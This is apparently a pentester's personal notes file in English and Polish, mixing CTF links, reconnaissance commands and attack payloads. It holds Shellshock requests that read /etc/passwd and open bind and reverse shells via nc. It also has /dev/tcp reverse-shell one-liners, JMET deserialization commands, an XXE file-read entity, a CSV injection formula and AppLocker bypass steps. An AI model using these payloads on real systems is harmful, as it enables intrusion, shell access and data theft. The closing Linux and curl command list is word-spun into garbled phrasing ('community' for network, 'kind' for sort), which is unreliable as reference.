
https://lab.pentestit.ru/
https://jhalon.github.io/pentestit-lab-11-intro/
https://jhalon.github.io/pentestit-lab-10-intro/
https://lab.pentestit.ru/docs/TL9_WU_en.pdf
https://lab.pentestit.ru/docs/TL8_WU_en.pdf 

mount read only:
mount -o ro source:/data local/directory/


A keylogger (logging every key pressed, as well as control characters such as Delete or Backspace)

To find sub-domains: <= the dns-brute.nse script will find valid DNS (A) records by trying a list of common sub-domains and finding those that successfully resolve
$nmap -p 80 --script dns-brute.nse vulnweb.com

To find hosts on IP:
$nmap -p 80 --script hostmap-bfk.nse nmap.or

Traceroute Geolocation:
$sudo nmap --traceroute --script traceroute-geolocation.nse -p 80 hackertarget.com

http-enum.nse <= one of the more aggressive tests, the script effectively brute forces a web server path in order to discover web applications in use:
$nmap --script http-enum 192.168.10.55

445/tcp:
smb-os-discovery 192.168.1.0/24
$nmap -p 445 --script smb-os-discovery 192.168.1.0/24

JMS Client (Producer) --- Connection --- Broker (Queue, Topic) --- Connection --- JMS Client (Consumer)

Gadget mode:
$java -jar jmet-0.1.0-all.jar -u test -pw test -Q cwqueue -I Artemins -Y xterm target 8080

Running JMET against NNMI
$java -jar jmet-0.1.0-all.jar -u admin -pw admin -T nms.discovery.configurationPoll -I HornetQ -Y calc target 4457

$java -jar jmet-0.1.0-all.jar -I RabbitMQ 10.77.225.210 5671

Next, make sure nothing is currently using port 80 or port 443
$netstat -vantu | grep :80

$netstat -alnp | grep ssh
a all
l list
n number
p ?

http://resources.infosecinstitute.com/covering-tracks-of-attacks/

You're files are now ***

Tunneling is the process of encapsulating one protocol into another protocol. The protocol which is encapsulated is called the payload protocol and the protocol which encapsulates this protocol is called the delivery protocol.
Tunneling can be used for bypassing firewall restrictions and can even be used for providing a secure path over untrusted networks.

4 Step Checklist Methodology
Recon: Explore the site, Spider it!, Discover default content, Enumerate criteria based parameters
Analyze: Identify functionality, Identify entry points, Encoding mechanisms and data transmission, Technology stack used, Server fingerprinting, Code inspection
Test: Enumeration test, Client side checks, Authentication test, Logic flaws, Session mismanagement, CSRF, Access controls, Input based tests, Server side tests, Miscellaneous tests
Report: Observation, Risk/Impact, POC, Recommendation

jxplorer - do ldap

the known_hosts file lets the client authenticate the server, to check that it isn't connecting to an impersonator. The authorized_keys file lets the server authenticate the user.

Tip: TFTPTheft, Metasploit, Viproy TFTP module

Svmap is the common tool to enumerate the VoIP server and clients, it is available on Kali Linux, you can simply open the terminal on your machine and scan the entire network.
$svmap 192.168.0.1/24
SIP Device | User Agent | Fingerprint |

snoopit - framework do testowania aplikacji

Metasploit module for more confirmation to check whether any other devices using VoIP or not. The following module used to the situation:
>use auxiliary/scanner/sip/options

root@bt:/pentest/voip/smap# ./smap 192.168.1.104
smap 0.6.0 http://www.wormulon.net/
192.168.1.104: ICMP reachable, SIP enabled

in powershell:
>mstsc

root-me.org

in post:
password[] = absdf

$dmesg

$lsusb

Amazing logs:
$journalctl -r

ascii from hex:
>>>"7061756c".decode("hex")
'paul'

 rO0 - to widzisz w burpie (to jest zwykła wartość base64)
 ac ed - to jest hex - więc jak są krzaki jakieś w zapytaniu to trzeba patrzeć na zakładkę hex i wtedy szukać tego ciągu
 
 w springu ja bym szukał template injection czyli wstrzyknięcie w jakiś parametr ${12*12} powinno Ci zwrócić wynik tego działania
 
 What is XML Parsing?
 Parsing XML refers to going through XML document to access data or to modify data in one or other way.
 
 Template injection:
 ${12*12}
 $%00{12*12}
 %{5+5}
 {{6*6}}
 #{4*4}
 
 XML Stores New Line as LF
 
 An expanded <date> element is used in the third example:
 <note>
  <date>
    <year>2008</year>
    <month>01</month>
    <day>10</day>
  </date>
  <to>Tove</to>
  <from>Jani</from>
</note>
 
What I'm trying to say here is that metadat (data about data) should be stored as attributes, and the data itself should be stored as elements.




rmi: JMiniX Console

We use the cewl tool to generate a wordlist from the website content. Command usage:
$cewl -w /root/Desktop/words.txt -m 6 <Target>

Now we used John the Ripper to apply its great ruleset, resulting in a list of mutated passwords. Command usage:
$john -wordlist=words.txt -rules -stdout > words-john.txt

$ssh noob@192.168.181.137 -i noob '() {:;}; nc -lvvp 1234'

$sudo -u app-script-ch1-cracker cat /challenge/app-script/ch1/ch1/../ch1cracked/.passwd

Shellshock

environment variable is a function using (), then we will add an emtpy body for the function. Finally, we can start adding the command we want to run after the function declaration

Reading arbitrary files by the following payload:
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80

You will need to inspect the HTTP headers of the response to see the file's content

Bind shell:
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80

Bind shell - we need tto connect to this, reverse shell - the server connect back to us

Reverse shell:
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80

DISCLAIMER: <> is not responsible for any damage or instability caused by running, installing or using  this VM image.
Use at your own risk.

WARNING: This is a vulnerable system, DO NOT run this OS in a production environment. Nor should you give this system access to the outside world

check the Bwapp <- Buggy Web Application

MRTG (Multi Router Traffic Grapher) - tool to monitor the traffic load on network-links

Snipping tool on Linux:
$apt-get install shutter
$yum install shutter

vulnerable to hearbleed
msf auxiliary(openssl_heartbleed)
exploit shows flag

SSL
$openssl s_client -connect IP:port
...server response...

The IRC protocol is a layer on top of the IP protocol

https://www.rabbitmq.com/tutorials/tutorial-one-python.html

(tzn JMS/kolejki, nie deserializacja) :)
aha no i deserializacja to nie jedyne co można zrobić z kolejkami, tak jak mówiłem czasami obiekty w kolejce idzie zamienić na RCE poprzez funkcjonalność oprogramowania

https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/

Serialization is the process by which your programming language lets you convert data to a static, binary format, suitable for saving to disk or sending over the network.

Unserialization, or deserialization, is exactly the opposite. It takes binary data and converts it back to something that you can use.

$java SerializeTest
bob
$xxd name.ser
000000: aced 0005

Notice the file on disk "name.ser" is binary, it has some non-printable characters. In particular the bytes "aced 0005" - these are the "magic bytes" you'll see at the beginning of any Java serialized object.

One is base64 encoded and can be seen in the rightmost column beginning with "rO0AB".

The other is raw binary going over the wire, so we'll have to look at the hex column in the middle. It begins with the bytes "as ed 00 05 73 72".

Spring Framework

ustanowione połączenie na poziome sieci nie oznacza dostępu, prawda? :)

gobuster -u http://192.168.1.28/control/ -f -e -x html,jpg,css,txt,png,gif,lock,zip,git,php -w /usr/share/wordlists/dirb/common.txt

TODO:
built an MD5 detector

curl -v -X POST http://t3rm1n4l.ctf/term.php --data "command=t3rm1n4l.ctf"


https://3mrgnc3.ninja/2017/04/d0not5top-ctf-walkthrough-by-digip/

http://www.korznikov.com/2017/06/walkthrough-easy-komodo-ctf-wasted-245h.html


https://www.hackingloops.com/capturetheflag/

https://www.vortex.id.au/2017/08/sectalks-adelaide-donkeydocker-ctf-walkthrough/


https://itfellover.com/vulnhub-breach-1-0-boot2root-ctf-challenge-walkthrough/

http://brakeingsecurity.com/2017-030-vulnerability-osint-and-our-derbycon-walkthrough

<?xml version="1.0" ?>
<!DOCTYPE xxe [
 <!ELEMENT xxe ANY>
 <!ENTITY xxe "vulnerable">
]>
<xxe>&xxe;</xxe>

$nc -klvp 80
k set keepalive option on socket

NOTE:
 The Tester found also possible escalation path...
 
Description
 This vulnerability has been reported to the vendor

the application do not check session cookie and session id from request, which means that it is possible to manage application without authentication

$echo '#!/bin/ksh' > itmcmd
$echo '/bin/bash' >> itmcmd
$./itmcmd agent start 10

attacker:
$nc -nlvp 443 <= -n numeric only, no DNS
And the "kill" command is replaced with:
bash+-i+>%26+/dev/tcp[attackers_ip]/443+0>%261

<!DOCTYPE CIM [ <!ENTITY remote SYSTEM "file:///proc/uptime">]>

meterpreter session
>getuid
>getsystem
>getuid

FTP Anonymous Login [M]

Przygotujmy więc filtr, który enkoduje wyjście z czytanego pliku do base64. Wygląda następująco: php://filter/convert.base64-encode/resource=/bin/bash

arbitraty loaded mlet

At this point, pentester discontinued further escalation.

$proxychains python jdwo.py -t IP -p PORT --cmp 'ping myIP -c 5'

AppLocker Bypass - Windows AppLocker mechanism can be bypassed to run arbitrary binaries - Restrict access to Windows Registry and/or enable "DLL Rule Collection" in AppLocker

1 - Command Prompt in form of DLL run using rundll32.exe
in run: runddl32 D:\Users\ehack1...\cmd.sll
Command Prompt successfully executed

>whoami
>hostname
>date /t

2 - Add a registry key that specifies additional CPLs loaded by Control Panel:
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Control Panel\CPLs with value:
"myCPL"="C:\\Windows\\Tasks\\cmd.cpl"
pointing to Command Prompt in form of CPL (cmd.cpl)

The CPL is loaded when Control Panel is open, executing Command Prompt

Rundll32 can be alsu used to run PowerShell:
>rundll32 PowerShell,main -w
It was also possible to evade Antivirus, using custom DLL, and run Meterpreter that connected to pentester's workstation

API call returning user details without authentication

Screen which shows

bash -i?&/dev/tcp/<IP>/<PORT> 0>&1

$lsapsearch -H ldaps://IP -x -C -b "" objectclass=top

CSV Injection:
Added command as a filed value:
=cmd|' /C calc!A0

After exporting the document and opening in Excel by an unware user

Configure all community interface parameters:
$ifconfig -a

Print the route packets take to community host:
$traceroute geekflare.com

Perform DNS lookups:
$dig geekflare.com

Question Internet area to identify servers:
$nslookup geekflare.com

Assessment every of your community connections and open sockets:
$netstat

Secure copy recordsdata:
$scp <filename> [email protected]:/<path>

Print an abstract of the present exercise on the system, together with what every person is doing, and their processes. Also checklist the logged in customers and system load common for the previous 1, 5 and 15 minutes:
$w

Enable network interface:
$ifup eth0

Disable network interface:
$ifdown eth0

Change permission in find command:
$find /choose/ -type f -perm 777 -exec chmod 755 ;

Find any file owned by root:
$find / -user root

Find information older than 60 days:
$find / -name entry.log -mtime +60

Record the information earlier than you delete files:
$find / -name entry.log -mtime +60 -exec ls -ltr ;

Find and delete file entry.log older than 60 days:
$find / -name entry.log -mtime +60 -exec rm ;

Find files higher than 1  GB:
$find / -size +1G

Check time of last reboot:
$who -by

Check how long the server is up:
$uptime

Show whole and free Memory resource:
$free -m

Show whole, free and cached Memory resources:
$free -G

Verify CPU utilization:
$sar

Verify Memory utilization:
$sar -r

Kill the method:
$kill PID

Kill the method forcefully:
$kill -9 PID

Compression:
$gzip filename

Extract the gz file:
$gunzip filename

Find out CPU Cores, MHz, CPU producer, Model Name and rather more by utilizing:
$cat /proc/cpuinfo

Find out memory data:
$cat /proc/meminfo

Discover out file system dimension and utilization in GB:
$df -h

Show statictics for all protocols:
$netstat -s

Show kernel routing data:
$netstat -r

Show the record of community interfaces:
$netstat -i

Display kernel model:
$uname -r

Show file measurement in human readable format (e.g. KB..):
$ ls -lh

Shutdown system after 10 minutes:
$shutdown -h +10

Rebuild the initrd picture:
$mkinitrd

Overview boot messages:
$dmesg

File to set a kernel parameter:
sysctl.conf

Configuration file for ports:
providers

Examine disk utilization in human readable and type by measurement:
$du -sh * | kind

Checklist the password and its associated particulars an person:
$chage -l <username>

Examine reminiscence map of a given course of id 5264:
$pmap 5264

Confirm crontab entry for a selected person:
$crontab -u <username> -l

Change hostname:
1. change ../sysconfig/community
HOSTNAME=
2. change ../hosts
127.0.0.1	localhost.localdomain	localhost

Show request and response header with curl:
$curl -v example.com

Download at restrict fee with curl:
$curl --limit-rate 2000B <IP>

Use proxy with curl:
$curl --proxy yourproxy:port <url>

Test URL with injecting header with curl:
$curl --header 'Content-Type: utility/json' <url>

Add further header with curl:
$curl –-header “X-CustomHeader: PTE” <URL>

Display solely response header:
$curl -I <IP>

Connect HTTPS/SSL URL and ignore any SSL certificates error:
$curl --insecure <URL>

Connect utilizing particular protocol (SSL/TLS):
$curl --sslv2 <URL>
$curl --sslv3 <URL>
$curl --tlsv1 <URL>

Download file from FTP Server:
$curl -u consumer:password -O ftp://ftpurl/type.css





























































